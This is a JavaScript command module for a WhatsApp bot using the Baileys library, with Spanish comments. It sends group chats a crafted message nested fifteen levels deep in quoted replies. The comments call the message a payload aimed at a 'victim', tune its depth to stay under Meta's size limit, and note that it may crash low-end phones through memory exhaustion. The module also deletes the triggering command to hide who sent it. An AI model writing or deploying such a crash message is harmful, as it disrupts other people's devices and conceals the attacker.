import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

export default {
    name: 'quoted_inception',
    match: (text) => /^\.abismo/i.test(text),
    execute: async ({ sock, remitente, msg }) => {
        
        const isGroup = remitente.endsWith('@g.us');
        if (!isGroup) return sock.sendMessage(remitente, { text: "❌ Módulo diseñado exclusivamente para grupos." }, { quoted: msg });

        try {
            // Borramos el comando para no dejar rastro del desencadenante
            try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}

            const senderJid = msg.key.participant || msg.key.remoteJid;

            // 1. Definimos la singularidad (el mensaje que está en el fondo del abismo)
            // Usamos un JID genérico de sistema (0@s.whatsapp.net) para darle un toque más anómalo
            let estructuraRecursiva = {
                conversation: "Singularidad alcanzada."
            };

            // 2. Bucle de recursividad (Inception)
            // 15 niveles es el punto óptimo. Más de 20 y los servidores de Meta pueden descartar 
            // el paquete por sobrepasar el límite de bytes del payload, o peor, causar un OOM en teléfonos de gama baja.
            const nivelesProfundidad = 15;

            for (let i = 0; i < nivelesProfundidad; i++) {
                // Envolvemos la estructura anterior dentro de un nuevo quotedMessage
                estructuraRecursiva = {
                    extendedTextMessage: {
                        text: `Capa de profundidad: ${nivelesProfundidad - i}`,
                        contextInfo: {
                            participant: senderJid, // Hacemos que la víctima parezca estar respondiéndose a sí misma cayendo
                            stanzaId: `ABYSS${i}${Date.now()}`, // ID fantasma para cada capa
                            quotedMessage: estructuraRecursiva // <--- Aquí ocurre la magia de la anidación infinita
                        }
                    }
                };
            }

            // 3. Empaquetamos y disparamos el payload a la red
            const waMsg = generateWAMessageFromContent(remitente, estructuraRecursiva, { userJid: sock.user.id });

            await sock.relayMessage(remitente, waMsg.message, { messageId: waMsg.key.id });

        } catch (err) {
            console.error("Error Quoted Inception:", err);
            await sock.sendMessage(remitente, { text: `❌ Falla en la recursividad del protocolo: ${err.message}` });
        }
    }
};
